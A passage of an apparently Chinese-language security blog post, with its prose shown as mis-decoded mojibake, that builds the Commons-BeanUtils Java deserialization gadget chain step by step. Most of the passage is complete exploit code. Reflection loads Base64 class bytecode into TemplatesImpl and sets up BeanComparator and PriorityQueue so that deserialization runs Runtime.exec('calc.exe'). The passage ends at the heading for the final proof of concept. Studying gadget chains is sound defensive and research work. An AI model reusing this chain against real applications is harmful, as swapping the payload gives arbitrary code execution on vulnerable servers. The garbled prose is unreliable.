xsw6a;<br><br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavaBeanTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> PropertyUtils.getProperty(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JavaBean</span>(), <span class="hljs-string">&quot;name&quot;</span>);<br>        System.out.println(name);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051440903.png" alt="QQæˆªå›¾20220305144036"></p><h2 id="BeanComparator-compare"><a href="#BeanComparator-compare" class="headerlink" title="BeanComparator#compare"></a>BeanComparator#compare</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051446886.png" alt="QQæˆªå›¾20220305144522"></p><p>è¯¥ç±»ç»§æ‰¿äº†<strong>Comparator</strong>ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051446211.png" alt="QQæˆªå›¾20220305144607"></p><p>å¦‚æœpropertyä¸ºç©ºåˆ™æ¯”è¾ƒä¼ å…¥çš„å‚æ•°ï¼Œå¦åˆ™è¿›å…¥tryï¼Œç„¶åè°ƒç”¨ä¸€ä¸ªJavaBeançš„getteræ–¹æ³•ã€‚è¿™æ—¶å€™å°±æƒ³åˆ°äº†ã€‚ä¹‹å‰åˆ©ç”¨çš„TemplatesImplåŠ è½½æ¶æ„ç±»ä¸­çš„getOutputPropertiesï¼Œåˆšå¥½æ»¡è¶³getterçš„å®šä¹‰ã€‚<br>æˆ‘ä»¬å¯ä»¥å…·ä½“æ¥çœ‹ä¸€ä¸‹ä»£ç ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051456435.png" alt="QQæˆªå›¾20220305145619"></p><p>é‚£ä¹ˆä¹Ÿå°±è¯´æˆ‘ä»¬å¦‚æœæ„é€ **PropertyUtils.getProperty( new TemplatesImpl(), OutputProperties )**å°±å¯ä»¥æˆåŠŸåŠ è½½æ¶æ„ç±»ã€‚<br>å…ˆä¸æ·»åŠ ååºåˆ—åŒ–å’Œåºåˆ—åŒ–ã€‚æ¥å®‰æ’ä¸€ä¸ªã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CbTestOne</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, NoSuchFieldException, IOException &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span> );<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//</span><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>,beanComparator);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br>        PropertyUtils.getProperty(templates,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051727342.png" alt="QQæˆªå›¾20220305172653"></p><h2 id="æ·»åŠ ä¸Šåºåˆ—åŒ–"><a href="#æ·»åŠ ä¸Šåºåˆ—åŒ–" class="headerlink" title="æ·»åŠ ä¸Šåºåˆ—åŒ–"></a>æ·»åŠ ä¸Šåºåˆ—åŒ–</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CbTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, NoSuchFieldException, IOException &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span> );<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//</span><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>,beanComparator);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br>        PropertyUtils.getProperty(templates,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> aClass1.getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);<br>        comparator.setAccessible(<span class="hljs-literal">true</span>);<br>        comparator.set(priorityQueue,templates);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass2</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.commons.beanutils.BeanComparator&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">property</span> <span class="hljs-operator">=</span> aClass2.getDeclaredField(<span class="hljs-string">&quot;property&quot;</span>);<br>        property.setAccessible(<span class="hljs-literal">true</span>);<br>        property.set(beanComparator,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="æ³¨æ„ç‚¹1"><a href="#æ³¨æ„ç‚¹1" class="headerlink" title="æ³¨æ„ç‚¹1"></a>æ³¨æ„ç‚¹1</h2><p>è¿™é‡Œç›¸æ¯”ä¸cc2æ¥è¯´ï¼Œpç¥è¿™é‡Œæ·»åŠ ä¸Šäº†<strong>PriorityQueue priorityQueue &#x3D; new PriorityQueue(2,beanComparator);<strong>æœ¬äººç›´æ¥æŒ‰ç…§cc2çš„ç†è§£å»èµ°,åé¢è·Ÿè¿›å»çœ‹äº†çœ‹ã€‚æ‰å‘ç°ã€‚å½“ä»£ç è·Ÿè¿›åˆ°ã€‚</strong>PriorityQueue#siftUpUsingComparator</strong>è¿™æ—¶å€™æç„¶å¤§æ‚Ÿï¼Œæˆ‘äººéƒ½å‚»äº†ï¼Œç»§ç»­è·Ÿè¿›ä»–ä¼šç›´æ¥è·³è½¬åˆ°<strong>BeanComparator#compare</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051819928.png" alt="QQæˆªå›¾20220305173004"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051819921.png" alt="QQæˆªå›¾20220305173013"></p><p>ä½†æ˜¯æˆ‘ä»¬è¦æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ï¼Œå°±å¿…é¡»æ˜¯çš„<strong>property</strong>ä¸ä¸ºç©ºï¼Œå¯ä»¥é€šè¿‡åå°„ç ´å±€ã€‚<code>property=outputProperties</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">aClass2</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.commons.beanutils.BeanComparator&quot;</span>);<br><span class="hljs-type">Field</span> <span class="hljs-variable">property</span> <span class="hljs-operator">=</span> aClass2.getDeclaredField(<span class="hljs-string">&quot;property&quot;</span>);<br>property.setAccessible(<span class="hljs-literal">true</span>);<br>property.set(beanComparator,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="æ³¨æ„ç‚¹2"><a href="#æ³¨æ„ç‚¹2" class="headerlink" title="æ³¨æ„ç‚¹2"></a>æ³¨æ„ç‚¹2</h2><p>ä¸Šé¢çš„æ·»åŠ ä¸Šååºåˆ—åŒ–ä»ç„¶ä¼šæŠ¥é”™çš„ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051818642.png" alt="image-20220305173956699"></p><p>æ‰€ä»¥pç¥æ‰ä¼šæ„é€ æˆï¼Œ<code>new Object[]&#123;templates,templates&#125;</code>ï¼Œå°†è¿™ä¸¤ä¸ªçš„å€¼ä¼ å…¥äº†<code>o1</code>å’Œ<code>o2</code></p><h2 id="æœ€ç»ˆPOC"><a href="#æœ€ç»ˆPOC" class="headerlink" title="æœ€ç»ˆPOC"></a>æœ€ç»ˆPOC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 